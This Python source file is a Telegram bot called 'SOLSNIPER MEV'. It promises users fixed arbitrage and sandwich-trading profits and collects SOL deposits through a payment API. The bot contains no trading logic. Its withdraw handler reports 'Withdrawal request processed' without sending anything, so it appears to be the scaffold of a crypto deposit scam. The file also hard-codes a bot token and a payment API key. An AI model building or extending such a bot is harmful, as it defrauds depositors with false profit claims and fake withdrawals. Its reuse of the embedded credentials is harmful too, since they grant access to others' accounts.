from typing import Final
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram import Update, ReplyKeyboardMarkup, KeyboardButton
from telegram.ext import CallbackContext, ConversationHandler, CallbackQueryHandler
from telegram.ext import Application, CommandHandler, MessageHandler, filters, ContextTypes, CallbackContext
import requests
from models import TelegramUser, Deposit
from sol import get_solana_price
import uuid
import json

TOKEN: Final = "6697505124:AAFJWLTxNMxBm6KLyFcR_9sHEz45mkc_y7Y"  # Replace with your actual bot token
BOT_USERNAME = "@HonkTonBot"


def generate_deposit_id():
    return f"BD-{uuid.uuid4().hex[:6].upper()}"

async def bot_send_text(update, context, bot_message):
    if update.message:
        await update.message.reply_text(bot_message, parse_mode='Markdown')
    elif update.callback_query:
        await update.callback_query.message.reply_text(bot_message, parse_mode='Markdown')
    else:
        print(f"Could not send message: {bot_message}")


async def start_command(update: Update, context: CallbackContext):
    telegram_id = update.effective_user.id
    username = update.effective_user.username

    user, created = TelegramUser.get_or_create(
        telegram_id=telegram_id,
        defaults={'username': username, 'balance': 0}
    )

    if created:
        print('New user created')
    else:
        print('User already exists')

    welcome_message = """
👋 Welcome to SOLSNIPER MEV

To get started, please deposit at least 6 SOL into your trading wallet to activate the SolSniper MEV.

Balance: 0 SOL ($0.00)

Select type of MEV to get started:

• **Arbitrage MEV**
  • Deposit: 6-10 SOL
  • Profit: 2% - 5% per transaction.
  Profit from price differences between exchanges.

• **Sandwich MEV**
  • Deposit: 9-16 SOL
  • Profit: 3% - 7% per transaction.
  Profit by placing two transactions around a pending one.

**Typical profits (per 24 hr):**
  • 6 SOL: Earn 0.9-1.5 SOL
  • 12 SOL: Earn 2-4 SOL

⚠️ **Note:** 15% fee on profits.

Check out our SolSnipeMEV activity for reference and stay updated with our latest transactions and performance:
https://t.me/solsnipemevtxns

Use /start to see this menu again.

"""

    reply_keyboard = [
        ['Start SolSniper MEV 💻', 'Stop SolSniper MEV'],
        ['Deposit 💸', 'Balance 💰'],
        ['Withdraw 💸', 'Track Profits 📈'],
        ['Track SolSnipe MEV Activity 📊']
    ]

    reply_markup = ReplyKeyboardMarkup(reply_keyboard, one_time_keyboard=True)

    await update.message.reply_text(welcome_message, parse_mode='Markdown', reply_markup=reply_markup)
    return 0



async def handle_start_sol_snipe_mev(update: Update, context: CallbackContext):
    await bot_send_text(update, context, "SolSnipe MEV started!")
    # Add any additional logic here
    return 0

async def handle_stop_sol_snipe_mev(update: Update, context: CallbackContext):
    reply_keyboard = [
        [InlineKeyboardButton("Back ⬅️", callback_data="back")],
    ]
    reply_markup = InlineKeyboardMarkup(reply_keyboard)
    await context.bot.send_message(chat_id=update.effective_chat.id, text="Solsniper MEV stopped", reply_markup=reply_markup)
    return 0

async def handle_deposit(update: Update, context: CallbackContext):
    await bot_send_text(update, context, "How many SOL would you like to deposit?")
    return 'waiting_for_amount'  # Set the conversation state to 'waiting_for_amount'

async def handle_deposit_amount(update: Update, context: CallbackContext):
    print("handle_deposit_amount function called")
    amount = update.message.text
    print(f"Received amount: {amount}")
    try:
        solana_price = get_solana_price()
        amount = float(amount)
        usd_amount = amount * float(solana_price)
        if usd_amount < 0:
            if update.message:
                await bot_send_text(update, context, "Invalid amount. Please enter a positive number.")
            return 0

        else:
            print("Generating payment request...")

            url = "https://api.nowpayments.io/v1/payment"

            payload = json.dumps({
                "price_amount": usd_amount,
                "price_currency": "usd",
                "pay_currency": "sol",
                "ipn_callback_url": "https://nowpayments.io",
                "order_id": "RGDBP-21314",
                "order_description": "sol payment"
            })
            headers = {
                'x-api-key': 'ZP1SH6F-F39M03R-P0BD136-JS0WPCZ',
                'Content-Type': 'application/json'
            }
            try:
                response = requests.request("POST", url, headers=headers, data=payload)
                response.raise_for_status()
                data = json.loads(response.text)
            except requests.exceptions.RequestException as e:
                print(f"Error making POST request: {e}")
                if update.callback_query:
                    await update.callback_query.edit_message_text("Error generating payment request. Please try again later.")
                elif update.message:
                    await bot_send_text(update, context, "Error generating payment request. Please try again later.")
                return 0

            payment_id = data.get("payment_id")
            context.user_data['payment_id'] = payment_id
            payment_status = data.get("payment_status")
            pay_address = data.get("pay_address")
            created_at = data.get("created_at")

            deposit, created = Deposit.get_or_create(
            telegram_user=update.effective_user.id,
            now_id=payment_id,
            defaults={'amount': amount, 'created_at': created_at, 'status': payment_status}
            )

            if payment_id is None or payment_status is None or pay_address is None or created_at is None:
                print("Error parsing response data")
                if update.callback_query:
                    await update.callback_query.edit_message_text("Error generating payment request. Please try again later.")
                elif update.message:
                    await bot_send_text(update, context, "Error generating payment request. Please try again later.")
                return 0

            reply_keyboard = [
    [InlineKeyboardButton("Back ⬅️", callback_data="back"),
     InlineKeyboardButton("Confirm Payment 💸", callback_data="confirm_payment")]
]
        reply_markup = InlineKeyboardMarkup(reply_keyboard)
        await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Please send {amount} SOL to {pay_address} to complete the deposit. Your payment ID is {payment_id} and the current status is {payment_status}.", reply_markup=reply_markup)
    except ValueError:
        if update.callback_query:
            await update.callback_query.edit_message_text("Invalid amount. Please enter a positive number.")
            return 0
        elif update.message:
            await bot_send_text(update, context, "Invalid amount. Please enter a positive number.")
            return 0

async def confirm_payment(update: Update, context: CallbackContext):
    payment_id = context.user_data.get('payment_id')
    if payment_id:
        # Use the payment ID here

        url = f"https://api.nowpayments.io/v1/payment/{payment_id}"

        payload={}
        headers = {
        'x-api-key': 'ZP1SH6F-F39M03R-P0BD136-JS0WPCZ'
        }

        response = requests.request("GET", url, headers=headers, data=payload)

        data = json.loads(response.text)
        payment_status = data.get("payment_status")
        if payment_status == 'confirmed':
            telegram_user = TelegramUser.get(telegram_id=update.effective_user.id)
            deposit = Deposit.get(now_id=payment_id, telegram_user=telegram_user)
            amount = deposit.amount
            telegram_user.balance = amount
            telegram_user.save()
            deposit.status = 'confirmed'
            deposit.save()
            reply_keyboard = [
    [InlineKeyboardButton("Back ⬅️", callback_data="back")
     ]]
            reply_markup = InlineKeyboardMarkup(reply_keyboard)
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Confirmed your payment!", reply_markup=reply_markup)
        elif payment_status == 'waiting':
            reply_keyboard = [
    [InlineKeyboardButton("Back ⬅️", callback_data="back"),
     InlineKeyboardButton("Confirm Payment 💸", callback_data="confirm_payment")]
]
            reply_markup = InlineKeyboardMarkup(reply_keyboard)
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Waiting on you to make the payment!", reply_markup=reply_markup)
        elif payment_status == 'confirming':
            reply_keyboard = [
    [InlineKeyboardButton("Back ⬅️", callback_data="back"),
     InlineKeyboardButton("Confirm Payment 💸", callback_data="confirm_payment")]
]
            reply_markup = InlineKeyboardMarkup(reply_keyboard)
            await context.bot.send_message(chat_id=update.effective_chat.id, text=f"Confirming your Payment, Please continue to click the confirm payment button until your transactions shows confirmed!", reply_markup=reply_markup)
    else:
        print("No payment ID found in session")

async def handle_balance(update: Update, context: CallbackContext):
    telegram_user = TelegramUser.get(telegram_id=update.effective_user.id)
    balance = telegram_user.balance
    await bot_send_text(update, context, f"Your balance is {balance} SOL")
    return 0

async def handle_withdraw(update: Update, context: CallbackContext):
    await bot_send_text(update, context, "How many SOL would you like to withdraw?")
    return 'waiting_for_withdraw_amount'  # Set the conversation state to 'waiting_for_withdraw_amount'

async def handle_withdraw_amount(update: Update, context: CallbackContext):
    amount = update.message.text
    # Add logic to process the withdrawal request
    await bot_send_text(update, context, f"Withdrawal request processed. You have withdrawn {amount} SOL")
    return 0

async def handle_track_profits(update: Update, context: CallbackContext):
    # Add logic to track profits
    await bot_send_text(update, context, "Tracking profits...")
    return 0

async def handle_track_sol_snipe_mev_activity(update: Update, context: CallbackContext):
    # Add logic to track SolSnipe MEV activity
    await bot_send_text(update, context, "Tracking SolSnipe MEV activity...")
    return 0



async def error(update: Update, context: ContextTypes.DEFAULT_TYPE):
    print(f'Update {update} caused error {context.error}')

async def handle_message(update: Update, context: CallbackContext):
    
    message_type: str = update.message.chat.type
    text = update.message.text

    if text == 'Start SolSniper MEV':
        await handle_start_sol_snipe_mev(update, context)
        return 0
    elif text == 'Stop SolSniper MEV':
        await handle_stop_sol_snipe_mev(update, context)
        return 0
    elif text == 'Deposit':
        await handle_deposit(update, context)
        return 0
    elif text == 'Balance':
        await handle_balance(update, context)
        return 0
    elif text == 'Withdraw':
        await handle_withdraw(update, context)
        return 0
    elif text == 'Track Profits':
        await handle_track_profits(update, context)
        return 0
    elif text == 'Track SolSnipe MEV Activity':
        await handle_track_sol_snipe_mev_activity(update, context)
        return 0
    else:
        await update.message.reply_text("Invalid command. Please try again.")

async def handle_callback_query(update: Update, context: CallbackContext):
    query = update.callback_query
    data = query.data
    if data == "back":
        await query.message.reply_text("Going back to start...")
        await handle_balance(update, context)
    elif data == "confirm_payment":
        await confirm_payment(update, context)


if __name__ == "__main__":
    app = Application.builder().token(TOKEN).build()

    deposit_handler = ConversationHandler(
        entry_points=[MessageHandler(filters.TEXT & ~filters.COMMAND, handle_deposit)],
        states={
            0: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_deposit_amount)],
        },
        fallbacks=[],
    )

    conversation = ConversationHandler(
    entry_points=[CommandHandler('start', start_command)],
    states={
        0: [MessageHandler(filters.TEXT & ~filters.COMMAND, handle_message)],
    },
    fallbacks=[],
   )
    
    app.add_handler(CommandHandler('start', start_command))
    app.add_handler(deposit_handler)
    app.add_handler(conversation)
    app.add_handler(CallbackQueryHandler(handle_callback_query))
    app.add_error_handler(error)

    print("polling")
    app.run_polling(poll_interval=3)